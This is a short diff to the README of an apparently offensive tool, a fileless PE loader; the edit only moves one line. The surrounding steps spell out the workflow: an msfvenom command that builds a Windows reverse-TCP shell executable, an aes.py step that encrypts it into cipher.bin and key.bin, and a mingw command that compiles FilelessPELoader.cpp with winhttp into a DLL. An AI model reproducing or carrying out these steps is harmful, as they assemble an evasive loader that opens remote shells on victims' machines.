@@ -11,7 +11,8 @@ STEPS TO REPRODUCE:
    ```msfvenom -p windows/x64/shell_reverse_tcp lhost=IP lport=PORT -f exe -o shell.exe```
 
     ```python3 aes.py shell.exe```
-   Successfull execution of the above command will result two files named cipher.bin and key.bin.
+
+Successfull execution of the above command will result two files named cipher.bin and key.bin.
 
 5. Use the following command to compile FilelessPELoader.cpp to a dll.
    ```x86_64-w64-mingw32-g++ FilelessPELoader.cpp -l winhttp -shared --static -o a.dll```
